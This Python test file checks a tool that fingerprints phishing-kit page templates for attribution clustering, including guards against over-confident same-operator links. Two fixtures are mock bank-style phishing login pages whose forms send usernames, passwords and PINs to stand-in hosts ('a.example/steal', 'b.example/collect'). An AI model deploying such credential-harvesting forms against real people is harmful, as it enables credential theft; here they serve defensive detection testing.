#!/usr/bin/env python3
"""test_kit_template_fingerprint.py — gate on the kit-template structural fingerprint.

Run:  python3 tests/test_kit_template_fingerprint.py     (zero deps)
      pytest tests/test_kit_template_fingerprint.py -q     (also works)

WHAT THIS PROTECTS
  1. SIBLING KITS MATCH. Two deployments of the same kit on different hosts, with swapped
     brand/text, must score high structurally.
  2. UNRELATED PAGES DON'T. A structurally different page must score low.
  3. THE COMMODITY TRAP (the attribution-safety test). Two pages that match only because they
     share a WordPress/Wix template must be graded commodity_template_noise, edge=none — never a
     same-operator link (§2.5 / RULE 5).
  4. NEVER AUTO-MERGE. Even a strong non-commodity match is graded a LOWER-RUNG lineage edge,
     not same-operator.
  5. MALFORMED DEGRADES.
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "scripts"))

import kit_template_fingerprint as kf  # noqa: E402

FAILURES = []


def check(label, cond, detail=""):
    if cond:
        print("  ok   {}".format(label))
    else:
        print("  FAIL {} {}".format(label, detail))
        FAILURES.append(label)


# Same kit, different host/brand/text — identical structure + harvest form.
KIT_A = """<html><head><title>Acme Bank Login</title></head><body>
<header><nav><ul><li>Home</li><li>Login</li></ul></nav></header>
<main><section><form action="https://a.example/steal">
  <label>User</label><input name="username">
  <label>Pass</label><input name="password">
  <input name="pin"><button>Sign in</button></form></section></main>
<footer><div><img src="https://a.example/assets/logo.png"></div></footer></body></html>"""

KIT_B = """<html><head><title>Globex Secure Portal</title></head><body>
<header><nav><ul><li>Start</li><li>Access</li></ul></nav></header>
<main><section><form action="https://b.example/collect">
  <label>ID</label><input name="username">
  <label>Secret</label><input name="password">
  <input name="pin"><button>Enter</button></form></section></main>
<footer><div><img src="https://b.example/assets/logo.png"></div></footer></body></html>"""

UNRELATED = """<html><head><title>Blog</title></head><body>
<article><p>A long blog post about gardening.</p><p>More text.</p></article>
<aside><ul><li>Recent</li></ul></aside></body></html>"""

# Two pages that match ONLY because both are WordPress (commodity template).
WP_A = """<html><head><meta name="generator" content="WordPress 6.4">
<link href="/wp-content/themes/twenty/style.css"></head><body>
<div><section><div><article><p>Site A content</p></article></div></section></div></body></html>"""
WP_B = """<html><head><meta name="generator" content="WordPress 6.4">
<link href="/wp-content/themes/twenty/style.css"></head><body>
<div><section><div><article><p>Site B content</p></article></div></section></div></body></html>"""


def test_sibling_kits_match():
    print("\n[1] sibling kit deployments match structurally")
    r = kf.similarity(kf.fingerprint(KIT_A), kf.fingerprint(KIT_B))
    check("high similarity", r["score"] >= 0.75, r["score"])
    check("identical form field-name set noted",
          any("form field-name set" in s for s in r["shared_features"]), r["shared_features"])
    check("graded candidate_same_kit", r["grade"] == "candidate_same_kit", r["grade"])
    check("edge is lower-rung, not same-operator",
          r["clustering_edge"] == "lineage_low_confidence", r["clustering_edge"])


def test_unrelated_low():
    print("\n[2] unrelated page scores low")
    r = kf.similarity(kf.fingerprint(KIT_A), kf.fingerprint(UNRELATED))
    check("low similarity", r["score"] < 0.5, r["score"])
    check("no clustering edge", r["clustering_edge"] in ("none", "hold"), r["clustering_edge"])


def test_commodity_trap():
    print("\n[3] commodity-template match is graded noise, NOT attribution (RULE 5)")
    fa, fb = kf.fingerprint(WP_A), kf.fingerprint(WP_B)
    check("WordPress marker detected", any("wordpress" in m or "wp-content" in m for m in fa["markers"]),
          fa["markers"])
    r = kf.similarity(fa, fb)
    check("high raw structural similarity", r["score"] >= 0.6, r["score"])
    check("graded commodity_template_noise", r["grade"] == "commodity_template_noise", r["grade"])
    check("clustering edge is none", r["clustering_edge"] == "none", r["clustering_edge"])
    check("commodity flag set", r["commodity"] is True)


def test_never_auto_merge():
    print("\n[4] no grade produces a same-operator auto-merge edge")
    for a, b in ((KIT_A, KIT_B), (WP_A, WP_B), (KIT_A, UNRELATED)):
        r = kf.similarity(kf.fingerprint(a), kf.fingerprint(b))
        check(f"edge != same_operator ({r['grade']})", r["clustering_edge"] != "same_operator",
              r["clustering_edge"])


def test_malformed_degrades():
    print("\n[5] malformed markup degrades, never crashes")
    for junk in ("<div><form", "", "<<>>", "<input name="):
        try:
            fp = kf.fingerprint(junk)
            check(f"handled {junk!r}", isinstance(fp, dict) and "structure_hash" in fp)
        except Exception as e:  # noqa: BLE001
            check(f"handled {junk!r}", False, repr(e))


def test_refs_marker_applies():
    print("\n[6] B5: analyst --refs / extra_commodity markers actually suppress a lineage edge")
    # two hosts, same kit, marker present ONLY in an asset path (no generator meta)
    a = "<html><body><div><section><form><input name=u><input name=p></form></section>" \
        "<img src='https://h1.example/mykit/loader.js'></div></body></html>"
    b = a.replace("h1.example", "h2.example")
    without = kf.similarity(kf.fingerprint(a), kf.fingerprint(b))
    check("without ref -> lineage edge", without["clustering_edge"] == "lineage_low_confidence", without)
    fa = kf.fingerprint(a, extra_commodity=["mykit"])
    fb = kf.fingerprint(b, extra_commodity=["mykit"])
    r = kf.similarity(fa, fb, extra_commodity=["mykit"])
    check("B5 ref marker -> commodity True", r["commodity"] is True, r)
    check("B5 ref marker -> edge none", r["clustering_edge"] == "none", r)
    # m2: case-insensitive marker
    fa2 = kf.fingerprint(a, extra_commodity=["MyKit"])
    check("m2 case-insensitive ref marker", kf._is_commodity(fa2, ["MyKit"])[0] is True)


def test_commodity_midband():
    print("\n[7] M5: a commodity page in the 0.5-0.6 band is graded noise, not 'dissimilar'")
    # engineer a moderate structural overlap + a WordPress marker on one side
    a = "<html><head><meta name=generator content='WordPress 6.4'></head><body>" \
        "<div><section><article><p>x</p></article></section></div>" \
        "<nav><ul><li>a</li></ul></nav></body></html>"
    b = "<html><body><div><section><aside><p>y</p></aside></section></div>" \
        "<footer><table><tr><td>z</td></tr></table></footer></body></html>"
    r = kf.similarity(kf.fingerprint(a), kf.fingerprint(b))
    check("commodity flagged on one side", r["commodity"] is True, r)
    if 0.5 <= r["score"] < 0.6:
        check("M5 mid-band commodity -> noise", r["grade"] == "commodity_template_noise", r)
    else:
        # if the crafted score lands outside the band, the invariant still must hold:
        check("M5 commodity never graded dissimilar with edge!=none when score>=0.5",
              not (r["score"] >= 0.5 and r["clustering_edge"] != "none"), r)


def test_edge_vocabulary():
    print("\n[8] reachable clustering edges are a subset of the safe set (no same_operator)")
    seen = set()
    for a, b in ((KIT_A, KIT_B), (KIT_A, UNRELATED), (WP_A, WP_B)):
        seen.add(kf.similarity(kf.fingerprint(a), kf.fingerprint(b))["clustering_edge"])
    check("edges subset of safe set", seen <= {"none", "hold", "lineage_low_confidence"}, seen)


for _t in (test_sibling_kits_match, test_unrelated_low, test_commodity_trap,
           test_never_auto_merge, test_malformed_degrades, test_refs_marker_applies,
           test_commodity_midband, test_edge_vocabulary):
    _t()

if FAILURES:
    print(f"\nFAIL — {len(FAILURES)} check(s) failed:")
    for f in FAILURES:
        print("  -", f)
    sys.exit(1)
print("\nPASS — all kit-template-fingerprint checks green")


def test_kit_template_fingerprint():
    """pytest entry point — module body runs the checks at import time."""
    assert not FAILURES, FAILURES
